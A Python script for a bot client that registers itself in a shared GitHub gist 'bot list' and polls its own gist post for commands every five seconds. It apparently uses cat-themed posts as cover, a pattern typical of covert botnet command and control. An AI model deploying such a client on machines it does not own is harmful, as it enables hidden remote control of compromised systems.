import sys
import time
import json
from Bot import gist
from Bot.Commands import alive


def read_params():
    """
    Read parameters from input path (sys.argv[1])

    :return:    filename:   Filename to be used in gist post
                name:       Name of the cat to be used in gist post
                urls:       Possible urls for use in the psot
                images_dir: Path to directory with images
    """
    file = open(sys.argv[1] + "/params.txt", mode="r")
    json_data = file.read()
    data = json.loads(json_data)

    filename = data['filename']
    name = data['name']
    urls = data['urls']
    return filename, name, urls, sys.argv[1] + "/imgs"


FILENAME, NAME, URLS, IMAGES_DIR = read_params()
BOT_LIST = "CatsIWantToPet.md"

# Prepare helper folders
gist.init_folders()

# Check if bot list exists, if not exit
GIST_API = gist.get_gist_api()
posts = GIST_API.get_gists()
bot_list_exists = False
for p in posts:
    if BOT_LIST in p['files']:
        bot_list_exists = True
        break

if not bot_list_exists:
    print("BOT LIST DOES NOT EXISTS - BYE BYE", file=sys.stderr)
    exit(-1)

# Create bot -> bot post + add to bot list
print("Starting bot init ...")
gist.init(GIST_API, NAME, FILENAME, BOT_LIST)

# TO BE CONTINUED
while True:
    # Check if in bot list -> if not = add
    if "[" + NAME + "]" not in gist.get_raw(GIST_API, BOT_LIST):
        print("WARNING: {} was not in the bot list :o -> adding...".format(NAME), file=sys.stderr)
        bot_url = gist.create_bot_post(GIST_API, NAME, FILENAME)
        gist.add_to_bot_list(GIST_API, NAME, FILENAME, bot_url, BOT_LIST)

    # Control commands in my post (cmds + active)
    print("Check status for reset ...")
    alive.i_am(GIST_API, FILENAME)
    time.sleep(5)

# Cleanup all helper folders
# gist.clean_up_folders()
